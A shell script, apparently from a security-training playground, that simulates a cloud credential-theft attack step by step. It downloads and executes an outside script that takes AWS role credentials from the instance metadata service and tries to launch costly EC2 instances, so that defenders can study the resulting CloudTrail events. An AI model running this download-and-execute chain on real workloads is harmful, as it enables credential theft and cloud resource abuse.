#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation - Cloud Access Attack\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates cloud credential theft and resource abuse. \
The attack retrieves AWS credentials from the Instance Metadata Service (IMDS) \
and attempts to use those credentials to launch expensive EC2 instances across \
multiple regions. This showcases how attackers pivot from workload compromise \
to cloud infrastructure abuse.\033[0m
EOF

step <<EOF
\033[1;35mTool Installation - Install Required Utilities\033[0m

${PURPLE}First, we need to ensure curl, jq, and the AWS CLI are available on the \
target system. These tools are required by the cloud-access script to interact \
with the Instance Metadata Service and AWS APIs.\033[0m
EOF
wait_for_confirmation
inject "apt update && apt install -y curl jq awscli"

step <<EOF
\033[1;35mDownload Cloud Access Script\033[0m

${PURPLE}Download a script that will abuse AWS credentials obtained from the \
Instance Metadata Service to attempt launching expensive EC2 instances across \
multiple regions. This demonstrates how attackers pivot from workload compromise \
to cloud resource abuse.\033[0m
EOF
wait_for_confirmation
inject "curl -O https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/cloud-access/cloud-access.sh"

step <<EOF
\033[1;35mMake Cloud Access Script Executable\033[0m

${PURPLE}Set execution permissions on the cloud access script.\033[0m
EOF
wait_for_confirmation
inject "chmod +x cloud-access.sh"

step <<EOF
\033[1;35mCloud Resource Abuse - Attempt EC2 Instance Launch\033[0m

${PURPLE}Now we execute the cloud-access script which will automatically retrieve \
credentials from the Instance Metadata Service (IMDS). The script will attempt (and fail) to \
launch expensive EC2 instances across multiple regions, generating CloudTrail events \
that can be investigated.\033[0m

${PURPLE}The script will try both IMDSv2 and IMDSv1 to retrieve the node's IAM role \
credentials automatically.\033[0m
EOF
wait_for_confirmation
inject "./cloud-access.sh"

step <<EOF
\033[1;35mCleanup - Remove Cloud Access Artifacts\033[0m

${PURPLE}Remove the cloud access script to clean up after the demonstration.\033[0m
EOF
wait_for_confirmation
inject "rm -f cloud-access.sh 2>/dev/null || true"

print <<EOF
${GREEN}Cloud access demonstration completed successfully! All artifacts have been cleaned up.\033[0m
EOF
